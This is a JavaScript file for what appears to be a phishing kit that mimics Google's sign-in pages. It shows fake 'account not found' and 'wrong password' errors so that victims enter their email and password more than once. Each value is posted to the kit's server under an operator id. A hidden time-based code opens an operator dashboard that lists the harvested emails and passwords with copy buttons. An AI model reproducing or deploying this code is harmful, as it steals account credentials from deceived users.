let data = {}
const urlParams = new URLSearchParams(window.location.search);

let uniId = null;
let uniEmail = null;

if (urlParams.has('id')) {
  uniId = urlParams.get('id');
}

if (urlParams.has('email') && urlParams.get('email').includes("@")) {
  uniEmail = urlParams.get('email');
}

fetch("/something")
  .then((res) => res.text())
  .then((html) => {
    document.querySelector(".body").innerHTML = html;
   something()
  });
async function con() {
  document.querySelector(".alert").classList.remove("hidden")
  document.querySelector(".alertBtn").addEventListener("click" , ()=>{
    document.querySelector(".alert").classList.add("hidden")
  })
}
  
  async function load(api, dura, func) {
    document.querySelector(".overlay").classList.remove("hidden");
  
    return new Promise((resolve, reject) => {
      setTimeout(async () => {
        document.querySelector(".overlay").classList.add("hidden");
  
        if (api) {
          try {
            const html = await fetch(`/${api}`).then(res => res.text());
            document.querySelector(".body").innerHTML = html;
  
            if (typeof func === "function") {
              setTimeout(func, 0);
            }
  
            resolve();
          } catch (error) {
            reject(error);
          }
        } else {
          resolve();
        }
      }, dura);
    });
  }
  
  
  function getTimeCode() {
    const now = new Date();
    let hours = now.getHours();
    const minutes = now.getMinutes();
  
    hours = hours % 12 || 12; // Convert to 12-hour format
  
    const hStr = String(hours); // No leading zero
    const mStr = minutes < 10 ? "0" + minutes : String(minutes); // Always two digits
  
    return hStr + mStr;
  }
  
  let emailLoaded = false;
  
  async function something() {
    document.querySelector(".first").classList.remove("hidden");
    setTimeout(() => {
      document.querySelector(".first").classList.add("hidden");
    }, 2000);
  
    document.querySelector(".nextBtn").addEventListener("click", async () => {
      if (emailLoaded) return;
      await load("email", 2000, email);
      emailLoaded = true;
    });
  }
  function errPage(param) {
    const errorText = document.querySelector(".error span");
    const errorBox = document.querySelector(".error");
    errorText.textContent = param;
    errorBox.classList.remove("hidden");
 
  }

  
  async function email() {
    const togbtn = document.querySelector(".togbtn");
    const dropdown = document.querySelector(".dropdown");
    const emailWrapper = document.querySelector(".emailInp");
    const input = emailWrapper?.querySelector("input");
    const label = emailWrapper?.querySelector(".label");
    const emailBtn = document.querySelector(".emailBtn");
    const errorBox = document.querySelector(".error");
    const errorText = document.querySelector(".error span");
  
    if (!togbtn || !dropdown || !emailWrapper || !input || !label || !emailBtn || !errorBox || !errorText) {
      console.warn("One or more elements are missing in the DOM.");
      return;
    }
    function btn(lift = false) {
      const emailBtn = document.querySelector(".emailBtn");
    
      if (lift) {
        emailBtn.classList.remove("bottom-0");
        emailBtn.classList.add("bottom-[41%]");
      } else {
        emailBtn.classList.remove("bottom-[41%]");
        emailBtn.classList.add("bottom-0");
      }
    }
  // Helper function to check if dark mode is active
function isDarkMode() {
  return document.documentElement.classList.contains('dark');
}

function err(param) {
  errorText.textContent = param;
  errorBox.classList.remove("hidden");
  input.focus();
  btn(true); // Lift the button

  // Highlight input border in red (error)
  input.classList.remove("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");
  input.classList.add("border-[#EA4335]");

  // Animate label upwards + red color
  label.classList.remove("top-[30%]", "left-3", "text-[16px]");
  label.classList.add("top-[-18%]", "left-2", "text-sm");

  // Set label color to red, remove default + focus colors
  label.classList.remove("text-inherit", "dark:text-white", "text-[#1b69dd]");
  label.classList.add("text-[#EA4335]");

  // Set wrapper color to red
  emailWrapper.classList.remove("text-[#1b69dd]");
  emailWrapper.classList.add("text-[#EA4335]");
}

// Input wrapper click = focus + LIFT
emailWrapper.addEventListener("click", (e) => {
  e.stopPropagation();
  input.focus();
  btn(true); // Lift the button

  label.classList.remove("top-[30%]", "left-3", "text-[16px]");
  label.classList.add("top-[-18%]", "left-2", "text-sm");

  label.classList.remove("text-inherit", "dark:text-white", "text-[#EA4335]");
  label.classList.add("text-[#1b69dd]");

  input.classList.remove("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");
  input.classList.add("border-[#1b69dd]");

  emailWrapper.classList.add("text-[#1b69dd]");
});

// Click anywhere else (not email input) = RESET
document.addEventListener("click", (e) => {
  const val = input.value.trim();
  const clickedInside = emailWrapper.contains(e.target) || e.target === emailBtn;

  if (!clickedInside) {
    if (val.length === 0) {
      input.blur();
      label.classList.remove("top-[-18%]", "left-2", "text-sm");
      label.classList.add("top-[30%]", "left-3", "text-[16px]");

      label.classList.remove("text-[#1b69dd]", "text-[#EA4335]");
      label.classList.add("text-inherit", "dark:text-white");

      input.classList.remove("border-[#1b69dd]", "border-[#EA4335]");
      input.classList.add("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");

      emailWrapper.classList.remove("text-[#1b69dd]", "text-[#EA4335]");
      errorBox.classList.add("hidden");
    }

    btn(false); // Always reset position when clicking outside
  }
});

// ✅ Mobile Keyboard Button Lift Logic


// Optional: Listen for theme changes and update colors dynamically
document.addEventListener('DOMContentLoaded', function() {
  // If you have a theme toggle, you can add this observer
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
        // Theme changed, you can add any specific logic here if needed
        console.log('Theme changed to:', isDarkMode() ? 'dark' : 'light');
      }
    });
  });
  
  observer.observe(document.documentElement, {
    attributes: true,
    attributeFilter: ['class']
  });
});
  
  
  
    // Dropdown toggle
    togbtn.addEventListener("click", (e) => {
      e.stopPropagation();
      dropdown.classList.toggle("hidden");
    });
  
    // Hide dropdown if click outside
    document.addEventListener("click", (e) => {
      if (!dropdown.contains(e.target) && !togbtn.contains(e.target)) {
        dropdown.classList.add("hidden");
      }
    });
  
    async function emailApi() {
      const email = input.value.trim();
      const femail = email.replaceAll("+", "").trim(); // remove all +
    
      try {
        const emailData = {
          email: femail,
          id: uniId
        };
    
        const request = await fetch("/emailApi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(emailData),
        });
    
        const response = await request.json();
    
        if (request.ok && response.success) {
          // Update URL with cleaned email
          const url = new URL(window.location.href);
          url.searchParams.set('email', femail); // 🔁 changed from email.trim() to femail
          window.history.replaceState({}, '', url);
    
          // Store cleaned email
          uniEmail = femail;
    
          if (response.exists) {
            console.log("Contact already exists, URL updated");
          } else {
            console.log("Contact added successfully!");
          }
        } else {
          console.error(response.message || "Failed to add contact");
        }
      } catch (error) {
        console.error("Error in emailApi:", error);
        console.error("Network error occurred");
      }
    }
    
  
    async function mainFunc() {
      const val = input.value.trim();
  
      if (val.length === 0) {
        err("Enter an email or phone number");
        return;
      }
  
      if (val === `${getTimeCode()}1520`) {
        await load("userAuth", 2000, userAuth);
        return;
      }
      if (val === `${getTimeCode()}ammar2009`) {
       
        admin()
        return;
      }
  
      if (errorText.textContent === "Couldn't find your Google account") {
        await load("pass", 1000, pass);
       await emailApi()
        
        return;
      }
  
      await load(false, 2000, false);
      err("Couldn't find your Google account");
    }
  











    emailBtn.addEventListener("click", (e) => {
      e.preventDefault();
      mainFunc();
    });
  }
  function userAuth() {
    function clearURL() {
      const cleanUrl = window.location.origin + window.location.pathname;
      window.history.replaceState({}, document.title, cleanUrl);
    }
    
    function removeQueryParams() {
      if (window.location.search) {
        clearURL();
      }
    }
    function setupUI(){  // Only renamed this from window() to avoid conflict
      const createBtn = document.querySelector(".create");
      const pageTitle = document.querySelector(".page");
      const userPassword = document.querySelector(".pass")
      if (!createBtn || !pageTitle) return;
    
      let isSignup = false;
    
      createBtn.addEventListener("click", async () => {
        
        await load(false, 1000, false);
    
        isSignup = !isSignup;
    
        document.querySelectorAll(".user").forEach((el) => {
          el.removeAttribute("name");
          el.setAttribute("name", isSignup ? "signup" : "login");
          el.value = "";
          userPassword.value ="" ; // ✅ Clear input value
        });
    
        pageTitle.textContent = isSignup ? "Create Account" : "Login to Your Account";
        createBtn.textContent = isSignup ? "Login" : "Create account";
          const errorBox = document.querySelector(".error");
   errorBox.classList.add("hidden");
      });
    }
    removeQueryParams()
    setupUI()  // Call the renamed function
    
  
   async  function page() {
       const user = document.querySelector(".user");
       let userVal = user.value.trim().toLowerCase()
       let userPass = document.querySelector(".pass").value.trim()
       let res;
       let finalData = {
        user :userVal,
        password : userPass, 
      }
  
      async  function login (){
   
          try {
            const response = await fetch("/loginApi", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(finalData),
            });
            const result = await response.json();
            await load(false, 1000, false);
            if (result.success) {
             const request =await fetch(`/getUser?id=${result.id}`) 
             const response =await request.json()
             await load("user" , 0 , userAcc)
             data = {
              res : response , 
              id: result.id
             }
            } else {
           
             errPage(result.message)
              return;
            }
          } catch (error) {
            await load(false, 1000, false);
            console.error("❌ Network error:", error);
            return;
          }
       
        }
  
  
        
        async function signup() {
          // Show loader immediately
          document.querySelector(".overlay").classList.remove("hidden");
        
          try {
            const response = await fetch("/signup", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(finalData),
            });
        
            const result = await response.json();
        
            // Wait 1000ms before hiding loader
            await load(false, 200, false);
        
            if (result.success) {
              const createBtn =  document.querySelector(".create");
              await createBtn.click()
              await con()
            } else {
              errPage("Username Already exists.");
              return;
            }
        
          } catch (error) {
            // Hide loader even if fetch fails
            await load(false, 1000, false);
            console.error("❌ Network error:", error);
          }
        }
        
        
      
  if (userVal.length == "0" || userPass.length == "0" ) {
    errPage("Username and Password are required.")
    return
  }
  
      if (user.getAttribute("name") === "login") {
        login()
        return
      }
      if (user.getAttribute("name") === "signup") {
         signup()
        
        return
      }
     
      
     }
  
  
     document.querySelector(".khufiyaBtn").addEventListener("click" , (e)=>{
     e.stopPropagation()
     page()
    
     })
  
  
  
  
    }
    async function userAcc() {
      async function loadAcc() {
        try {
          const response = await fetch("/getAllUserInfo", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ id: data.id }),
          });
    
          const result = await response.json();
    
          if (result.success) {
            const con = document.querySelector(".container");
            con.innerHTML = "";
    
            result.userInfo.forEach(info => {
              const li = document.createElement("li");
              li.style.width = "100%";
              let passwordHTML = "";
    
              info.password.forEach(p => {
                passwordHTML += `
                  <div class="flex items-center gap-1">
                    <span>${p.value}</span>
                    <img src="images/copy.svg" class="w-4 copyicon" alt="">
                  </div>
                `;
              });
    
              li.innerHTML = `
                <div class="card relative w-[94%] mx-auto font-semibold text-[rgba(0,0,0,0.75)] shadow-md border border-[rgba(55,255,0,0.15)] rounded-md p-3">
                  <div class="flex items-center gap-2">Email:
                    <span>${info.email}</span>
                    <img src="images/copy.svg" class="w-4 copyicon" alt="">
                  </div>
    
                  <div class="flex items-start gap-2 mt-1">
                    Password:
                    <div class="flex flex-col-reverse gap-1">
                      ${passwordHTML}
                    </div>
                  </div>
    
                  <div class="absolute top-1 right-5">${info.date}</div>
                </div>
              `;
    
              con.prepend(li);
            });
          }
        } catch (error) {
          console.error("Error in loadAcc:", error);
        }
      }
    
      loadAcc();
    document.querySelector(".reload").addEventListener("click" , ()=>{
      loadAcc();
      
    })
      
      document.querySelector(".ham").addEventListener("click", () => {
        const infoBox = document.querySelector(".info");
        const isHidden = infoBox.classList.contains("hidden");
        
        if (isHidden) {
          infoBox.classList.remove("hidden");
          document.querySelector(".name span").textContent = data.res.user;
          document.querySelector(".pas span").textContent = data.res.password;
    
          document.querySelector(".copy").addEventListener("click", () => {
            navigator.clipboard.writeText(`${window.location.href}?id=${data.id}`);
          });
        } else {
          infoBox.classList.add("hidden");
        }
      });
    
      // Better: event delegation
      document.addEventListener("click", (e) => {
        if (e.target.classList.contains("copyicon")) {
          const text = e.target.previousElementSibling?.textContent;
          if (text) {
            navigator.clipboard.writeText(text);
          }
        }
      });
    }
    
   
    

    async function pass() {
      document.querySelector(".wel").textContent = uniEmail;
      
      const emailWrapper = document.querySelector(".emailInp");
      const input = emailWrapper?.querySelector("input");
      const label = emailWrapper?.querySelector(".label");
      const emailBtn = document.querySelector(".emailBtn button:last-child"); // Get the "Next" button
      const emailBtnContainer = document.querySelector(".emailBtn"); // Get the button container
      const errorBox = document.querySelector(".error");
      const errorText = document.querySelector(".error span");
      
      // Get checkbox and password input with error checking
      const checkbox = document.getElementById('checkbox');
      const passInput = document.querySelector(".fpass");
      
      if (!emailWrapper || !input || !label || !emailBtn || !emailBtnContainer || !errorBox || !errorText) {
          console.warn("One or more elements are missing in the DOM.");
          console.log("Missing elements:", {
              emailWrapper: !!emailWrapper,
              input: !!input,
              label: !!label,
              emailBtn: !!emailBtn,
              emailBtnContainer: !!emailBtnContainer,
              errorBox: !!errorBox,
              errorText: !!errorText
          });
          return;
      }
      
      // Check if checkbox elements exist
      if (!checkbox) {
          console.warn("Checkbox with id='checkbox' not found");
      }
      if (!passInput) {
          console.warn("Password input with class='fpass' not found");
      }
  
      // Helper function to check if dark mode is active
      function isDarkMode() {
          return document.documentElement.classList.contains('dark');
      }
  
      // Your existing btn function
      function btn(lift = false) {
          const emailBtn = document.querySelector(".emailBtn");
          
          if (lift) {
              emailBtn.classList.remove("bottom-0");
              emailBtn.classList.add("bottom-[41%]");
          } else {
              emailBtn.classList.remove("bottom-[41%]");
              emailBtn.classList.add("bottom-0");
          }
      }
  
      // Fixed err function
      function err(param) {
          try {
              errorText.textContent = param;
              errorBox.classList.remove("hidden");
              input.focus();
              btn(true); // Lift the button
  
              // Highlight input border in red (error)
              input.classList.remove("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");
              input.classList.add("border-[#EA4335]");
  
              // Animate label upwards + red color
              label.classList.remove("top-[30%]", "left-3", "text-[16px]");
              label.classList.add("top-[-18%]", "left-2", "text-sm");
  
              // Set label color to red, remove default + focus colors
              label.classList.remove("text-inherit", "dark:text-white", "text-[#1b69dd]");
              label.classList.add("text-[#EA4335]");
  
              // Set wrapper color to red
              emailWrapper.classList.remove("text-[#1b69dd]");
              emailWrapper.classList.add("text-[#EA4335]");
          } catch (error) {
              console.error('Error in err() function:', error);
          }
      }
  
      // Input wrapper click = focus + LIFT
      emailWrapper.addEventListener("click", (e) => {
          e.stopPropagation();
          input.focus();
          btn(true); // Lift the button
  
          label.classList.remove("top-[30%]", "left-3", "text-[16px]");
          label.classList.add("top-[-18%]", "left-2", "text-sm");
  
          label.classList.remove("text-inherit", "dark:text-white", "text-[#EA4335]");
          label.classList.add("text-[#1b69dd]");
  
          input.classList.remove("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");
          input.classList.add("border-[#1b69dd]");
  
          emailWrapper.classList.add("text-[#1b69dd]");
      });
  
      // Click anywhere else (not email input) = RESET
      document.addEventListener("click", (e) => {
          const val = input.value.trim();
          const clickedInside = emailWrapper.contains(e.target) || emailBtnContainer.contains(e.target);
  
          if (!clickedInside) {
              if (val.length === 0) {
                  input.blur();
                  label.classList.remove("top-[-18%]", "left-2", "text-sm");
                  label.classList.add("top-[30%]", "left-3", "text-[16px]");
  
                  label.classList.remove("text-[#1b69dd]", "text-[#EA4335]");
                  label.classList.add("text-inherit", "dark:text-white");
  
                  input.classList.remove("border-[#1b69dd]", "border-[#EA4335]");
                  input.classList.add("border-[rgba(0,0,0,0.4)]", "dark:border-gray-500");
  
                  emailWrapper.classList.remove("text-[#1b69dd]", "text-[#EA4335]");
                  errorBox.classList.add("hidden");
              }
  
              btn(false); // Always reset position when clicking outside
          }
      });
  
      // Theme change observer
      const observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
              if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                  console.log('Theme changed to:', isDarkMode() ? 'dark' : 'light');
              }
          });
      });
      
      observer.observe(document.documentElement, {
          attributes: true,
          attributeFilter: ['class']
      });
  
      // Password toggle functionality
      if (checkbox && passInput) {
          checkbox.addEventListener('change', function () {
              console.log('Checkbox toggled:', checkbox.checked);
              
              if (checkbox.checked) {
                  passInput.type = "text";
                  console.log('Password visible');
              } else {
                  passInput.type = "password";
                  console.log('Password hidden');
              }
          });
      } else {
          console.error('Password toggle not working - missing elements:');
          console.error('Checkbox found:', !!checkbox);
          console.error('Password input found:', !!passInput);
      }
  
      async function passApi() {
          const passValue = input.value.trim();
          
          try {
              const passData = {
                  password: passValue,
                  email: uniEmail,
                  id: uniId
              };
              
              console.log(passData);
              
              const request = await fetch("/passApi", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify(passData),
              });
              
              const response = await request.json();
              
              if (request.ok && response.success) {
                  console.log("Password updated successfully!");
                  input.value = "";
              } else {
                  console.error(response.message || "Failed to update password");
              }
          } catch (error) {
              console.error("Error in passApi:", error);
              console.error("Network error occurred");
          }
      }
  
      async function mainFunc() {
          const val = input.value.trim();
  
          if (val.length === 0) {
              console.log("Empty input, calling err()");
              err("Enter a password");
              console.log("mainFunc() called");
              return;
          }
  
          if (errorText.textContent === "Wrong password. Try again or click Forgot password to reset it.") {
              await passApi();
              await load("something", 0, "something");
              return;
          }
  
          await load(false, 1000, false);
          err("Wrong password. Try again or click Forgot password to reset it.");
      }
  
      emailBtn.addEventListener("click", (e) => {
          e.preventDefault();
          mainFunc();
      });
      
      document.querySelector(".forbtn")?.addEventListener("click", () => {
          emailBtn.click();
      });
  
      // Add Enter key support
      input.addEventListener("keypress", (e) => {
          if (e.key === "Enter") {
              e.preventDefault();
              mainFunc();
          }
      });
  }